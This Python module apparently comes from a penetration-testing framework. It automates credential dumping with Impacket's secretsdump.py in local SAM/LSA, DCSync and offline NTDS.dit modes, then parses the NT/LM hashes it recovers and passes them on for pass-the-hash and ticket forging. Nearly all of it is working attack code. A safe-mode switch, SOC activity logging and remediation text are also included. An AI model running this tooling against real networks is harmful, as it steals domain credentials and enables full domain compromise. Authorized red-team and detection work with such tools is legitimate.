"""Credential dumping via Impacket's ``secretsdump.py``.

Three modes are exposed:

* :class:`DumpMode.LOCAL` - local SAM and LSA secrets on a given host.
  Requires local admin (NT hash or password). Output: SAM users with
  RID:LMhash:NThash, plus LSA service account secrets, plus
  ``$MACHINE.ACC`` (machine account NTLM hash).
* :class:`DumpMode.DCSYNC` - pull NTDS.dit replication secrets from a
  Domain Controller. Requires an account with the
  ``DS-Replication-Get-Changes`` extended right (Domain Admin, or
  shadow / RBCD-acquired equivalent).
* :class:`DumpMode.NTDS_OFFLINE` - parse a previously copied
  ``NTDS.dit`` and ``SYSTEM`` hive on disk. Useful after ``ntdsutil``
  IFM exports.

Every dumped credential is fed back into the :class:`TargetManager` so
later phases (lateral movement, golden ticket, pass-the-hash, ...)
have something to work with.

Safe mode strictly disables this wrapper - credential dumping is always
considered *active* exploitation.
"""

from __future__ import annotations

import enum
import re
import shutil
import subprocess
from dataclasses import dataclass, field
from pathlib import Path

from core.logger import get_logger
from core.target_manager import Credential, Finding, TargetManager


class DumpMode(str, enum.Enum):
    LOCAL = "local"                # SAM + LSA on a host
    DCSYNC = "dcsync"              # NTDS via DRSUAPI (-just-dc-ntlm)
    NTDS_OFFLINE = "ntds-offline"  # offline parse of NTDS.dit + SYSTEM


# ``user:rid:lmhash:nthash:::`` - the canonical secretsdump SAM/NTDS line.
_RE_NTDS_LINE = re.compile(
    r"^(?P<user>[^:\r\n]+):"
    r"(?P<rid>\d+):"
    r"(?P<lm>[a-f0-9]{32}):"
    r"(?P<nt>[a-f0-9]{32}):::",
    re.IGNORECASE | re.MULTILINE,
)
# ``DOMAIN\COMPUTER$:plain_password`` - LSA $MACHINE.ACC line.
_RE_MACHINE_ACC = re.compile(
    r"\$MACHINE\.ACC.*?\n(?P<line>\S+)", re.IGNORECASE | re.DOTALL
)


@dataclass
class DumpResult:
    status: str                                       # completed / failed / error / skipped
    mode: str = ""
    target: str = ""
    output_file: str = ""
    credentials: list[dict] = field(default_factory=list)
    duration: int = 0
    stdout: str = ""
    stderr: str = ""


class SecretsDumper:
    """Configure and supervise a ``secretsdump.py`` run."""

    DEFAULT_TIMEOUT = 600
    _BIN_CANDIDATES = (
        "secretsdump.py", "impacket-secretsdump", "secretsdump",
    )

    def __init__(
        self,
        tm: TargetManager,
        mode: DumpMode | str,
        target: str = "",
        domain: str = "",
        username: str = "",
        password: str = "",
        nthash: str = "",
        ntds_file: str | Path | None = None,
        system_hive: str | Path | None = None,
        loot_dir: str | Path = "./loot",
        binary: str | None = None,
        timeout: int = DEFAULT_TIMEOUT,
        safe_mode: bool = False,
    ):
        self.tm = tm
        self.mode = mode if isinstance(mode, DumpMode) else DumpMode(mode)
        self.target = target
        self.domain = domain
        self.username = username
        self.password = password
        self.nthash = nthash
        self.ntds_file = Path(ntds_file) if ntds_file else None
        self.system_hive = Path(system_hive) if system_hive else None
        self.loot_dir = Path(loot_dir)
        self.binary = binary or self._resolve_binary()
        self.timeout = timeout
        self.safe_mode = safe_mode
        self.log = get_logger()

    def _resolve_binary(self) -> str | None:
        for cand in self._BIN_CANDIDATES:
            p = shutil.which(cand)
            if p:
                return p
        return None

    # ------------------------------------------------------------------
    # Preconditions
    # ------------------------------------------------------------------

    def check_prerequisites(self) -> tuple[bool, str]:
        if self.safe_mode:
            return False, (
                "safe mode enabled - credential dumping is active and "
                "strictly disabled"
            )
        if self.binary is None:
            return False, "secretsdump.py not found in PATH"

        if self.mode is DumpMode.NTDS_OFFLINE:
            if not self.ntds_file or not self.ntds_file.is_file():
                return False, "ntds-offline requires an existing NTDS.dit path"
            if not self.system_hive or not self.system_hive.is_file():
                return False, "ntds-offline requires an existing SYSTEM hive path"
            return True, ""

        # Authenticated modes (LOCAL / DCSYNC) need a target + creds.
        if not self.target:
            return False, "target host required"
        if not self.username:
            return False, "username required"
        if not (self.password or self.nthash):
            return False, "password or NT hash required"
        return True, ""

    # ------------------------------------------------------------------
    # Command builder
    # ------------------------------------------------------------------

    def _auth_string(self) -> str:
        """``[domain/]user[:password]@target`` impacket form."""
        principal = self.username
        if self.domain:
            principal = f"{self.domain}/{self.username}"
        if self.password:
            principal = f"{principal}:{self.password}"
        return f"{principal}@{self.target}"

    def build_command(self) -> list[str]:
        try:
            self.loot_dir.mkdir(parents=True, exist_ok=True)
        except OSError as exc:
            self.log.warn(f"Could not create loot dir: {exc}")

        outfile = self.loot_dir / f"secretsdump_{self.mode.value}_{self.target or 'offline'}"
        cmd: list[str] = [self.binary or "secretsdump.py"]

        if self.mode is DumpMode.NTDS_OFFLINE:
            # Offline form takes the SYSTEM hive via -system, the
            # NTDS.dit via -ntds, and the special ``LOCAL`` token.
            cmd.extend(["-ntds", str(self.ntds_file)])
            cmd.extend(["-system", str(self.system_hive)])
            cmd.append("LOCAL")
        else:
            cmd.append(self._auth_string())

        if self.nthash:
            lmnt = (
                self.nthash if ":" in self.nthash
                else f"aad3b435b51404eeaad3b435b51404ee:{self.nthash}"
            )
            cmd.extend(["-hashes", lmnt])

        if self.mode is DumpMode.DCSYNC:
            # ``-just-dc-ntlm`` is the lean DCSync mode (NT hashes only,
            # no Kerberos keys, no cleartext) - fast and what we want
            # for downstream pass-the-hash operations.
            cmd.append("-just-dc-ntlm")

        cmd.extend(["-outputfile", str(outfile)])
        return cmd

    # ------------------------------------------------------------------
    # Output parsing
    # ------------------------------------------------------------------

    def _parse_secretsdump_output(self, blob: str) -> list[dict]:
        creds: list[dict] = []
        for m in _RE_NTDS_LINE.finditer(blob):
            user = m.group("user")
            # Skip the trailing ``$``-suffixed machine accounts unless
            # we're in DCSYNC - they are noise on local SAM dumps.
            creds.append(
                {
                    "user": user,
                    "rid": int(m.group("rid")),
                    "lm_hash": m.group("lm"),
                    "nt_hash": m.group("nt"),
                }
            )
        return creds

    def _persist(self, creds: list[dict]) -> None:
        for c in creds:
            self.tm.add_credential(
                Credential(
                    username=c["user"],
                    domain=self.domain,
                    nt_hash=c["nt_hash"],
                    lm_hash=c["lm_hash"],
                    source=f"secretsdump/{self.mode.value}",
                )
            )
        if creds:
            self.tm.add_finding(
                Finding(
                    id=f"DUMP-{self.mode.value.upper()}-{self.target or 'offline'}",
                    title=(
                        f"{len(creds)} credential(s) extracted via "
                        f"secretsdump ({self.mode.value})"
                    ),
                    severity="critical",
                    host=self.target,
                    description=(
                        f"secretsdump.py recovered {len(creds)} hash entries. "
                        "These can be used for pass-the-hash, golden / silver "
                        "ticket forging, or offline cracking."
                    ),
                    remediation=(
                        "Rotate every exposed credential immediately, "
                        "rotate the krbtgt hash twice (24h apart) if a "
                        "DCSync occurred, and audit Tier-0 admin "
                        "delegations."
                    ),
                    evidence=f"{creds[0]['user']}:...:{creds[0]['nt_hash']}",
                )
            )

    # ------------------------------------------------------------------
    # Run
    # ------------------------------------------------------------------

    def run(self) -> DumpResult:
        ok, reason = self.check_prerequisites()
        if not ok:
            self.log.warn(f"secretsdump skipped: {reason}")
            return DumpResult(
                status="skipped",
                mode=self.mode.value,
                target=self.target,
                stderr=reason,
            )

        outfile = self.loot_dir / f"secretsdump_{self.mode.value}_{self.target or 'offline'}"
        cmd = self.build_command()
        self.log.action(
            f"secretsdump ({self.mode.value}) -> {self.target or 'offline'}: {' '.join(cmd)}"
        )
        # Operator command ledger (HTML report): the full command, secret and
        # all, so the operator can rerun it by hand. This is distinct from the
        # blue-team SOC CSV below, whose command field stays empty on purpose.
        self.tm.record_command(
            cmd, phase="Phase 3 - Credential Harvesting", tool="secretsdump",
            target=self.target or "offline",
        )
        # SOC log: DCSync (DRSUAPI replication) and local SAM/LSA dumping are
        # distinct, high-value ATT&CK techniques a SOC must detect. The
        # NTDS-offline mode touches no network, so it is not recorded.
        if self.mode is not DumpMode.NTDS_OFFLINE:
            # The SOC command field is intentionally left empty: secretsdump's
            # principal argument embeds the cleartext secret.
            self.tm.record_activity(
                "dcsync" if self.mode is DumpMode.DCSYNC else "secretsdump-local",
                self.target, phase="Phase 3 - Credential Harvesting",
                details=f"secretsdump mode '{self.mode.value}'",
            )
        try:
            proc = subprocess.run(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                # Detach stdin so secretsdump's getpass prompt cannot
                # block when the credential block is incomplete.
                stdin=subprocess.DEVNULL,
                text=True,
                timeout=self.timeout,
            )
        except FileNotFoundError as exc:
            self.log.error(f"secretsdump binary missing: {exc}")
            return DumpResult(
                status="error", mode=self.mode.value,
                target=self.target, stderr=str(exc),
            )
        except subprocess.TimeoutExpired as exc:
            self.log.warn(
                f"secretsdump timed out after {self.timeout}s"
            )
            return DumpResult(
                status="error", mode=self.mode.value,
                target=self.target, stderr=f"timeout: {exc}",
            )
        except Exception as exc:
            self.log.error(f"secretsdump crashed: {exc}")
            return DumpResult(
                status="error", mode=self.mode.value,
                target=self.target, stderr=str(exc),
            )

        if proc.returncode != 0:
            self.log.warn(f"secretsdump exited rc={proc.returncode}")

        combined = (proc.stdout or "") + "\n" + (proc.stderr or "")
        # Impacket also writes ``<outfile>.ntds`` / ``.sam`` on disk -
        # merge them into the parser input when present.
        for ext in (".ntds", ".sam", ".cached", ".secrets"):
            artefact = Path(str(outfile) + ext)
            if artefact.is_file():
                try:
                    combined += "\n" + artefact.read_text(
                        encoding="utf-8", errors="replace"
                    )
                except OSError:
                    pass

        creds = self._parse_secretsdump_output(combined)
        self._persist(creds)

        status = "completed" if proc.returncode == 0 or creds else "failed"
        if status == "completed":
            self.log.success(
                f"secretsdump: {len(creds)} credential(s) extracted"
            )

        return DumpResult(
            status=status,
            mode=self.mode.value,
            target=self.target,
            output_file=str(outfile),
            credentials=creds,
            stdout=proc.stdout or "",
            stderr=proc.stderr or "",
        )
